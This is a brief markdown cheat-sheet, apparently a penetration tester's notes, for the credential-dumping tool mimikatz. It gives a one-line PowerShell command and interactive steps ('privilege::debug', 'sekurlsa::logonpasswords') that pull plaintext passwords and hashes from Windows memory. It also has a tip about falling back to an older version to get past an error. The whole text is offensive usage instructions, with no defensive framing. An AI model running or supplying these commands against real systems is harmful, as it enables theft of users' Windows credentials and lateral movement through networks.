# mimikatz

## all in one command for non-interactive powershell
```
.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
```

## dump passwords
```
privilege::debug
sekurlsa::logonpasswords
```

## troubleshooting `ERROR kuhl_m_sekurlsa_acquireLSA Key import`
```
I tried an earlier version 2.1.1 #17763 and ran sekurlsa::logonpasswords just fine.
```
https://github.com/gentilkiwi/mimikatz/issues/248
